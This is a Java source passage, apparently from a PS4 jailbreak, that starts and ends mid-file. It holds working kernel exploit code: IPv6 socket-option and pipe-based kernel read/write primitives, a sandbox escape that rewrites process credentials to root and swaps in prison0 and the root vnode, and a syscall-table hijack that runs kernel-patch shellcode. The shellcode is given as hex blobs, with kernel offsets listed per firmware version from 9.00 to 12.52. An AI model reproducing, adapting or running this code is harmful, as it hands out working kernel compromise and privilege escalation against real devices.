    public static int getRthdr(int sd, Buffer buf, int len) {
        return getSockOpt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    public static void setRthdr(int sd, Buffer buf, int len) {
        setSockOpt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    public static void freeRthdrs(int[] sds) {
        for (int i = 0; i < sds.length; i++) {
            if (sds[i] >= 0) {
                setSockOpt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, new Buffer(1), 0);
            }
        }
    }

    // EVF operations
    public static int createEvf(long name, int flags) {
        long result = syscall(SYS_EVF_CREATE, name, 0L, (long)flags);
        if (result == -1) {
            throw new RuntimeException("evf_create() error: " + result);
        }
        return (int)result;
    }

    public static void setEvfFlags(int id, int flags) {
        long clearResult = syscall(SYS_EVF_CLEAR, (long)id, 0L);
        if (clearResult == -1) {
            throw new RuntimeException("evf_clear() error: " + clearResult);
        }

        long setResult = syscall(SYS_EVF_SET, (long)id, (long)flags);
        if (setResult == -1) {
            throw new RuntimeException("evf_set() error: " + setResult);
        }
    }

    public static void freeEvf(int id) {
        long result = syscall(SYS_EVF_DELETE, (long)id);
        if (result == -1) {
            throw new RuntimeException("evf_delete() error: " + result);
        }
    }

    // Array manipulation helpers
    public static void removeSocketFromArray(int[] sds, int index) {
        if (index >= 0 && index < sds.length) {
            for (int i = index; i < sds.length - 1; i++) {
                sds[i] = sds[i + 1];
            }
            sds[sds.length - 1] = -1;
        }
    }

    public static void addSocketToArray(int[] sds, int socket) {
        for (int i = 0; i < sds.length; i++) {
            if (sds[i] == -1) {
                sds[i] = socket;
                break;
            }
        }
    }

    // String extraction helper
    public static String extractStringFromBuffer(Buffer buf) {
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < 8; i++) {
            byte b = buf.getByte(i);
            if (b == 0) break;
            if (b >= 32 && b <= 126) {
                sb.append((char)b);
            } else {
                break;
            }
        }
        return sb.toString();
    }
}
public class Kernel {
    
    private static API api;

    static {
        try {
            api = API.getInstance();
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    
    public static class KernelAddresses {
        public long evfString = 0;
        public long curproc = 0;
        public long dataBase = 0;
        public long curprocFd = 0;
        public long curprocOfiles = 0;
        public long insideKdata = 0;
        public long dmapBase = 0;
        public long kernelCr3 = 0;
        public long allproc = 0;
        public long base = 0;
        
        public boolean isInitialized() {
            return curproc != 0 && insideKdata != 0;
        }
        
        public void reset() {
            evfString = 0;
            curproc = 0;
            dataBase = 0;
            curprocFd = 0;
            curprocOfiles = 0;
            insideKdata = 0;
            dmapBase = 0;
            kernelCr3 = 0;
            allproc = 0;
            base = 0;
        }
    }

    public static KernelAddresses addr = new KernelAddresses();
    
    public interface KernelInterface {
        void copyout(long kaddr, long uaddr, int len);
        void copyin(long uaddr, long kaddr, int len);
        void readBuffer(long kaddr, Buffer buf, int len);
        void writeBuffer(long kaddr, Buffer buf, int len);
        
        long kread8(long addr);
        void kwrite8(long addr, long val);
        int kread32(long addr);
        void kwrite32(long addr, int val);
    }
    
    // Global kernel R/W instance
    public static KernelInterface kernelRW = null;
    
    // Kernel read/write primitives
    public static class KernelRW implements KernelInterface {
        private int masterSock;
        private int workerSock;
        private Buffer masterTargetBuffer;
        private Buffer slaveBuffer;
        private long curprocOfiles;
        
        // Pipe-based kernel R/W 
        private int pipeReadFd = -1;
        private int pipeWriteFd = -1;
        private long pipeAddr = 0;
        private Buffer pipemapBuffer;
        private Buffer readMem;
        private boolean pipeInitialized = false;

        public KernelRW(int masterSock, int workerSock, long curprocOfiles) {
            this.masterSock = masterSock;
            this.workerSock = workerSock;
            this.curprocOfiles = curprocOfiles;
            
            this.masterTargetBuffer = new Buffer(0x14);
            this.slaveBuffer = new Buffer(0x14);
            this.pipemapBuffer = new Buffer(0x14);
            this.readMem = new Buffer(0x1000);
        }

        public void initializePipeRW() {
            if (pipeInitialized) return;
            
            createPipePair();
            
            if (pipeReadFd > 0 && pipeWriteFd > 0) {
                pipeAddr = getFdDataAddr(pipeReadFd);
                if ((pipeAddr >>> 48) == 0xFFFF) {
                    pipeInitialized = true;
                    kernelRW = this;
                } else {
                }
            } else {
            }
        }
        
        private void createPipePair() {
            Buffer fildes = new Buffer(8);
            long result = Helper.syscall(Helper.SYS_PIPE, fildes.address());
            if (result == 0) {
                pipeReadFd = fildes.getInt(0);
                pipeWriteFd = fildes.getInt(4);
            }
        }

        private void ipv6WriteToVictim(long kaddr) {
            masterTargetBuffer.putLong(0, kaddr);
            masterTargetBuffer.putLong(8, 0);
            masterTargetBuffer.putInt(16, 0);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
        }
        
        private void ipv6KernelRead(long kaddr, Buffer bufferAddr) {
            ipv6WriteToVictim(kaddr);
            Helper.getSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14);
        }

        private void ipv6KernelWrite(long kaddr, Buffer bufferAddr) {
            ipv6WriteToVictim(kaddr);
            Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14);
        }

        private long ipv6KernelRead8(long kaddr) {
            ipv6KernelRead(kaddr, slaveBuffer);
            return slaveBuffer.getLong(0);
        }
        
        private void ipv6KernelWrite8(long kaddr, long val) {
            slaveBuffer.putLong(0, val);
            slaveBuffer.putLong(8, 0);
            slaveBuffer.putInt(16, 0);
            ipv6KernelWrite(kaddr, slaveBuffer);
        }

        public void copyout(long kaddr, long uaddr, int len) {
            pipemapBuffer.putLong(0, 0x4000000040000000L);
            pipemapBuffer.putLong(8, 0x4000000000000000L);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr, pipemapBuffer);

            pipemapBuffer.putLong(0, kaddr);
            pipemapBuffer.putLong(8, 0);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);
            
            Helper.syscall(Helper.SYS_READ, (long)pipeReadFd, uaddr, (long)len);
        }

        public void copyin(long uaddr, long kaddr, int len) {
            pipemapBuffer.putLong(0, 0);
            pipemapBuffer.putLong(8, 0x4000000000000000L);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr, pipemapBuffer);

            pipemapBuffer.putLong(0, kaddr);
            pipemapBuffer.putLong(8, 0);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);

            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, uaddr, (long)len);
        }

        public void readBuffer(long kaddr, Buffer buf, int len) {
            Buffer mem = readMem;
            copyout(kaddr, mem.address(), len);
            for (int i = 0; i < len; i++) {
                buf.putByte(i, mem.getByte(i));
            }
        }

        public void writeBuffer(long kaddr, Buffer buf, int len) {
            copyin(buf.address(), kaddr, len);
        }

        public long getFdDataAddr(int sock) {
            long filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES;
            long fileAddr = ipv6KernelRead8(filedescentAddr + 0x0);
            return ipv6KernelRead8(fileAddr + 0x0);
        }

        public long getSockPktopts(int sock) {
            long fdData = getFdDataAddr(sock);
            long pcb = ipv6KernelRead8(fdData + KernelOffset.SO_PCB); 
            return ipv6KernelRead8(pcb + KernelOffset.INPCB_PKTOPTS);
        }
        
        // Setup pktinfo overlap for fast R/W
        public void setupPktinfo(long workerPktopts) {
            masterTargetBuffer.putLong(0, workerPktopts + 0x10);
            masterTargetBuffer.putLong(8, 0);
            masterTargetBuffer.putInt(16, 0);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
            
            // Initialize pipes immediately
            initializePipeRW();
        }
        
        public long kread8(long addr) {
            Buffer buf = new Buffer(8);
            readBuffer(addr, buf, 8);
            return buf.getLong(0);
        }
        
        public void kwrite8(long addr, long val) {
            Buffer buf = new Buffer(8);
            buf.putLong(0, val);
            writeBuffer(addr, buf, 8);
        }
        
        public int kread32(long addr) {
            Buffer buf = new Buffer(4);
            readBuffer(addr, buf, 4);
            return buf.getInt(0);
        }
        
        public void kwrite32(long addr, int val) {
            Buffer buf = new Buffer(4);
            buf.putInt(0, val);
            writeBuffer(addr, buf, 4);
        }
        
    }

    public static String readNullTerminatedString(long kaddr) {
        if (!isKernelRWAvailable()) {
            return "";
        }
        
        StringBuffer sb = new StringBuffer();
        
        while (sb.length() < 1000) {
            long value = kernelRW.kread8(kaddr);
            
            for (int i = 0; i < 8; i++) {
                byte b = (byte)((value >>> (i * 8)) & 0xFF);
                if (b == 0) {
                    return sb.toString();
                }
                if (b >= 32 && b <= 126) {
                    sb.append((char)(b & 0xFF));
                } else {
                    return sb.toString();
                }
            }
            
            kaddr += 8;
        }
        
        return sb.toString();
    }

    public static long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, long addr) {
        int len = 8;
        int offset = 0;

        for (int i = 0; i < len; i++) {
            readBuf.putByte(i, (byte)0);
        }

        while (offset < len) {
            pktinfo.putLong(8, addr + offset);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, pktinfo, pktinfoLen);
            
            Buffer tempBuf = new Buffer(len - offset);
            int n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset);

            if (n == 0) {
                readBuf.putByte(offset, (byte)0);
                offset++;
            } else {
                for (int i = 0; i < n; i++) {
                    readBuf.putByte(offset + i, tempBuf.getByte(i));
                }
                offset += n;
            }
        }

        return readBuf.getLong(0);
    }

    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock, long curprocOfiles) {
        long filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES;
        long fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0);
        return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0);
    }

    public static long findProcByName(String name) {
        if (!isKernelRWAvailable()) {
            return 0;
        }
        
        long proc = kernelRW.kread8(addr.allproc);
        int count = 0;
        
        while (proc != 0 && count < 100) {
            String procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM);
            if (name.equals(procName)) {
                return proc;
            }
            proc = kernelRW.kread8(proc + 0x0);
            count++;
        }

        return 0;
    }

    public static long findProcByPid(int pid) {
        if (!isKernelRWAvailable()) {
            return 0;
        }
        
        long proc = kernelRW.kread8(addr.allproc);
        int count = 0;
        
        while (proc != 0 && count < 100) {
            int procPid = kernelRW.kread32(proc + KernelOffset.PROC_PID);
            if (procPid == pid) {
                return proc;
            }
            proc = kernelRW.kread8(proc + 0x0);
            count++;
        }

        return 0;
    }

    public static long getProcCr3(long proc) {
        long vmspace = kernelRW.kread8(proc + KernelOffset.PROC_VM_SPACE);
        long pmapStore = kernelRW.kread8(vmspace + KernelOffset.VMSPACE_VM_PMAP);
        return kernelRW.kread8(pmapStore + KernelOffset.PMAP_CR3);
    }

    public static long virtToPhys(long virtAddr, long cr3) {
        if (cr3 == 0) {
            cr3 = addr.kernelCr3;
        }
        return cpuWalkPt(cr3, virtAddr);
    }

    public static long physToDmap(long physAddr) {
        return addr.dmapBase + physAddr;
    }

    // CPU page table walking
    private static final long CPU_PG_PHYS_FRAME = 0x000ffffffffff000L;
    private static final long CPU_PG_PS_FRAME = 0x000fffffffe00000L;

    private static int cpuPdeField(long pde, String field) {
        int shift = 0;
        int mask = 0;
        
        if ("PRESENT".equals(field)) { shift = 0; mask = 1; }
        else if ("RW".equals(field)) { shift = 1; mask = 1; }
        else if ("USER".equals(field)) { shift = 2; mask = 1; }
        else if ("PS".equals(field)) { shift = 7; mask = 1; }
        else if ("EXECUTE_DISABLE".equals(field)) { shift = 63; mask = 1; }
        
        return (int)((pde >>> shift) & mask);
    }

    public static long cpuWalkPt(long cr3, long vaddr) {
        long pml4eIndex = (vaddr >>> 39) & 0x1ff;
        long pdpeIndex = (vaddr >>> 30) & 0x1ff;
        long pdeIndex = (vaddr >>> 21) & 0x1ff;
        long pteIndex = (vaddr >>> 12) & 0x1ff;

        // pml4
        long pml4e = kernelRW.kread8(physToDmap(cr3) + pml4eIndex * 8);
        if (cpuPdeField(pml4e, "PRESENT") != 1) {
            return 0;
        }

        // pdp
        long pdpBasePa = pml4e & CPU_PG_PHYS_FRAME;
        long pdpeVa = physToDmap(pdpBasePa) + pdpeIndex * 8;
        long pdpe = kernelRW.kread8(pdpeVa);

        if (cpuPdeField(pdpe, "PRESENT") != 1) {
            return 0;
        }

        // pd
        long pdBasePa = pdpe & CPU_PG_PHYS_FRAME;
        long pdeVa = physToDmap(pdBasePa) + pdeIndex * 8;
        long pde = kernelRW.kread8(pdeVa);

        if (cpuPdeField(pde, "PRESENT") != 1) {
            return 0;
        }

        // large page
        if (cpuPdeField(pde, "PS") == 1) {
            return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffff);
        }

        // pt
        long ptBasePa = pde & CPU_PG_PHYS_FRAME;
        long pteVa = physToDmap(ptBasePa) + pteIndex * 8;
        long pte = kernelRW.kread8(pteVa);

        if (cpuPdeField(pte, "PRESENT") != 1) {
            return 0;
        }

        return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fff);
    }

    public static boolean postExploitationPS4() {
        
        if (addr.curproc == 0 || addr.insideKdata == 0) {
            return false;
        }

        long evfPtr = addr.insideKdata;
        
        String evfString = readNullTerminatedString(evfPtr);
        if (!"evf cv".equals(evfString)) {
            return false;
        }

        addr.dataBase = evfPtr - KernelOffset.getPS4Offset("EVF_OFFSET");

        if (!verifyElfHeader()) {
            return false;
        }

        if (!escapeSandbox(addr.curproc)) {
            return false;
        }
        
        applyKernelPatchesPS4();

        
        return true;
    }

    private static boolean verifyElfHeader() {
        long headerValue = kernelRW.kread8(addr.dataBase);
        
        int b0 = (int)(headerValue & 0xFF);
        int b1 = (int)((headerValue >>> 8) & 0xFF);
        int b2 = (int)((headerValue >>> 16) & 0xFF);
        int b3 = (int)((headerValue >>> 24) & 0xFF);


        if (b0 == 0x7F && b1 == 0x45 && b2 == 0x4C && b3 == 0x46) {
            return true;
        } else {
        }
        
        return false;
    }

    private static boolean escapeSandbox(long curproc) {
        
        if ((curproc >>> 48) != 0xFFFF) {
            return false;
        }
        
        long PRISON0 = addr.dataBase + KernelOffset.getPS4Offset("PRISON0");
        long ROOTVNODE = addr.dataBase + KernelOffset.getPS4Offset("ROOTVNODE");
        long OFFSET_P_UCRED = 0x40;
        
        long procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD);
        long ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED);
        
        if ((procFd >>> 48) != 0xFFFF || (ucred >>> 48) != 0xFFFF) {
            return false;
        }


        kernelRW.kwrite32(ucred + 0x04, 0); // cr_uid
        kernelRW.kwrite32(ucred + 0x08, 0); // cr_ruid
        kernelRW.kwrite32(ucred + 0x0C, 0); // cr_svuid
        kernelRW.kwrite32(ucred + 0x10, 1); // cr_ngroups
        kernelRW.kwrite32(ucred + 0x14, 0); // cr_rgid

        long prison0 = kernelRW.kread8(PRISON0);
        if ((prison0 >>> 48) != 0xFFFF) {
            return false;
        }
        kernelRW.kwrite8(ucred + 0x30, prison0);

        // Add JIT privileges
        kernelRW.kwrite8(ucred + 0x60, -1);
        kernelRW.kwrite8(ucred + 0x68, -1);

        long rootvnode = kernelRW.kread8(ROOTVNODE);
        if ((rootvnode >>> 48) != 0xFFFF) {
            return false;
        }
        kernelRW.kwrite8(procFd + 0x10, rootvnode); // fd_rdir
        kernelRW.kwrite8(procFd + 0x18, rootvnode); // fd_jdir

        
        return true;
    }

    private static void applyKernelPatchesPS4() {

        byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
        if (shellcode.length == 0) {
            return;
        }


        long mappingAddr = 0x920100000L;
        long shadowMappingAddr = 0x926100000L;
        
        long sysent661Addr = addr.dataBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
        int syNarg = kernelRW.kread32(sysent661Addr);
        long syCall = kernelRW.kread8(sysent661Addr + 8);
        int syThrcnt = kernelRW.kread32(sysent661Addr + 0x2c);

        kernelRW.kwrite32(sysent661Addr, 2);
        kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
        kernelRW.kwrite32(sysent661Addr + 0x2c, 1);
        
        int PROT_READ = 0x1;
        int PROT_WRITE = 0x2;
        int PROT_EXEC = 0x4;
        int PROT_RW = PROT_READ | PROT_WRITE;
        int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
        
        int alignedMemsz = 0x10000;
        
        // create shm with exec permission
        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);

        // create shm alias with write permission
        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);

        // map shadow mapping and write into it
        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
        
        for (int i = 0; i < shellcode.length; i++) {
            api.write8(shadowMappingAddr + i, shellcode[i]);
        }

        // map executable segment
        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
        
        Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
        
        
        kernelRW.kwrite32(sysent661Addr, syNarg);
        kernelRW.kwrite8(sysent661Addr + 8, syCall);
        kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt);
        
        Helper.syscall(Helper.SYS_CLOSE, writeHandle);
        
    }
    
    public static void setKernelAddresses(long curproc, long curprocOfiles, long insideKdata, long allproc) {
        addr.curproc = curproc;
        addr.curprocOfiles = curprocOfiles;
        addr.insideKdata = insideKdata;
        addr.allproc = allproc;
        
    }
    
    public static boolean isKernelRWAvailable() {
        return kernelRW != null && addr.isInitialized();
    }

    public static void initializeKernelOffsets() {
        KernelOffset.initializeFromHelper();
    }
}
public class KernelOffset {

    // proc structure
    public static final int PROC_PID = 0xb0;
    public static final int PROC_FD = 0x48;
    public static final int PROC_VM_SPACE = 0x200;
    public static final int PROC_COMM = 0x448;
    public static final int PROC_SYSENT = 0x470;

    // filedesc
    public static final int FILEDESC_OFILES = 0x0;
    public static final int SIZEOF_OFILES = 0x8;

    // vmspace structure  
    public static final int VMSPACE_VM_PMAP = 0x1C8;
    public static final int VMSPACE_VM_VMID = 0x1D4;

    // pmap structure
    public static final int PMAP_CR3 = 0x28;

    // network
    public static final int SO_PCB = 0x18;
    public static final int INPCB_PKTOPTS = 0x118;

    // PS4 IPv6 structure
    public static final int PS4_OFF_TCLASS = 0xb0;
    public static final int PS4_OFF_IP6PO_RTHDR = 0x68;

    private static Hashtable ps4KernelOffsets;
    private static Hashtable shellcodeData;
    private static String currentFirmware = null;

    static {
        initializePS4Offsets();
        initializeShellcodes();
    }

    private static void initializePS4Offsets() {
        ps4KernelOffsets = new Hashtable();

        // PS4 9.00
        addFirmwareOffsets("9.00", 0x7f6f27L, 0x111f870L, 0x21eff20L, 0x221688dL, 0x1107f00L, 0x4c7adL, 0x3977F0);

        // PS4 9.03/9.04  
        addFirmwareOffsets("9.03", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL, 0x3959F0);
        addFirmwareOffsets("9.04", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL, 0x3959F0);

        // PS4 9.50/9.51/9.60
        addFirmwareOffsets("9.50", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);
        addFirmwareOffsets("9.51", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);
        addFirmwareOffsets("9.60", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);

        // PS4 10.00/10.01
        addFirmwareOffsets("10.00", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L, 0x45B10);
        addFirmwareOffsets("10.01", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L, 0x45B10);

        // PS4 10.50/10.70/10.71
        addFirmwareOffsets("10.50", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);
        addFirmwareOffsets("10.70", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);
        addFirmwareOffsets("10.71", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);

        // PS4 11.00
        addFirmwareOffsets("11.00", 0x7fc26fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L, 0x58F10);

        // PS4 11.02
        addFirmwareOffsets("11.02", 0x7fc22fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L, 0x58F10);

        // PS4 11.50/11.52
        addFirmwareOffsets("11.50", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L, 0xE6C20);
        addFirmwareOffsets("11.52", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L, 0xE6C20);

        // PS4 12.00/12.02
        addFirmwareOffsets("12.00", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L, 0xE6C20);
        addFirmwareOffsets("12.02", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L, 0xE6C20);

        // PS4 12.50/12.52, fill only really needed ones
        addFirmwareOffsets("12.50", 0, 0x111fa18L, 0x2136e90L, 0, 0x110a760L, 0x47b31L, 0xE6C20);
        addFirmwareOffsets("12.52", 0, 0x111fa18L, 0x2136e90L, 0, 0x110a760L, 0x47b31L, 0xE6C20);
    }

    private static void initializeShellcodes() {
        shellcodeData = new Hashtable();

        shellcodeData.put("9.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b08000000000066448989c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("9.03", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b0800000000006644898994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("9.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00ebc7813d6d1900000000006644898924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("10.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600ebc7817d2039000000000066448989a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("10.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb0000006689811330210041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800ebc781eeb2470000000000668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("11.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300ebc781eec8350000000000668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("11.02", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300ebc7810ec935000000000066898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("11.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900ebc781aebe2f000000000066898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("12.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("12.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

        shellcodeData.put("9.04", shellcodeData.get("9.03"));
        shellcodeData.put("9.51", shellcodeData.get("9.50"));
        shellcodeData.put("9.60", shellcodeData.get("9.50"));
        shellcodeData.put("10.01", shellcodeData.get("10.00"));
        shellcodeData.put("10.70", shellcodeData.get("10.50"));
        shellcodeData.put("10.71", shellcodeData.get("10.50"));
        shellcodeData.put("11.52", shellcodeData.get("11.50"));
